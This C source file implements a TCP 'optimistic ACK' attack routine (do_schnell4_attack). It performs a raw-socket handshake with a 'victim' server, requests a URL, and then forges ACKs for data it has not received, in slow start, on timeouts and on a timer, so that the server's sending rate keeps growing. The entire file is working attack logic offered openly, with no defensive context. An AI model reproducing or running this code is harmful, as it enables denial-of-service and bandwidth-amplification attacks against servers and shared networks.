#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/types.h>
#include <pcap.h>
#include <netinet/tcp.h>

#include "schnell.h"
#include "packetqueue.h"


int do_schnell4_attack(rawSock){
	int retries=0;
	packet *p;
	int slowstart=1;
	int nSegments=1;
	unsigned int lastACK;
	struct timeval now;
	struct timespec timeout;
	int msDelay=usRTT*2;	// RTO is RTT+4*deviation, so estimate it
	int count,i;
	unsigned int tmp;
	int WindowMax=2<<30;
	int err;
	unsigned int ISN;
	pthread_t grabberThread;
	packetqueue *q;


	// do three way handshake
        do {
                sendSYN(rawSock);
                retries++;
        } while( getSYNACK(rawSock) && (retries < 10));
	ISN=victimSequence;
        victimSequence++;
        localSequence++;
        sendACK(rawSock);
	// send request
        sendHTMLGET(rawSock);   // send "GET URL\r\n" to server
	// setup stuff
	q = packetqueue_create();
	// FIXME might want to grab the ACK
        err=pthread_create(&grabberThread,NULL,packetGrabber3,q);
	lastACK=victimSequence;
	// loop until connection close
	while(!gotFINorRST){
		if(slowstart){
			gettimeofday(&now,NULL);
			now.tv_usec+=msDelay*1000;
			timeout.tv_sec = now.tv_sec;
			timeout.tv_nsec = now.tv_usec * 1000;
			// wait for a packet
			Window = MIN(65535,(nSegments+2)*MSS*2);
			if(pq_waitforpacket(q,&timeout)){		
				// got one 
				while((p = pq_dequeue_nowait(q))){
					printf("CASE 1: ");
					// did we drop one and not WRAP in the sequence
					if(((p->seq+MSS -lastACK)>MSS)&&((p->seq+MSS)>lastACK)){
						tmp = lastACK;
						count=0;
						while(tmp<(p->seq+MSS)){
							tmp+=MSS;
							ACK(rawSock,tmp);// send missing ACKs
							nSegments++;
							count++;
						}
						printf("faked %d packets; ",count);
					}
					ACK(rawSock,p->seq+MSS);	// ACK the one we got
					lastACK=p->seq+MSS;
					nSegments++;
					if((nSegments*MSS)>WindowMax)
						slowstart=0; // going to congestion control
					printf("SENT SS ACK: segs= %d : SEQ %u\n",nSegments,
							lastACK-ISN);
					free(p);
				}
				continue;	// got a packet while waiting
			}

			// no packet available at all: Timeout!
			// make up the next  packets, as if we got them
			count = nSegments/2;	// be conservative
			for(i=0;i<count;i++){
				lastACK+=MSS;
				ACK(rawSock,lastACK);
			}
			nSegments+=count;
			printf("Case 4: Faked Slowstart %d pacets to %d segments\n",
					count,nSegments);
		}else{	// !slowstart == congestion control
			// just make up an ACK everytime unit
			timeout.tv_sec=0;
			timeout.tv_nsec=msDelay*1000*1000/2;	// half of msDelay
			nanosleep(&timeout,NULL);
			lastACK+=MSS*(nSegments/2);	// half a window
			ACK(rawSock,lastACK);
		}// end of if(slowstart)else
	}	// while(!fin or rst)
	return 0;
}	// function

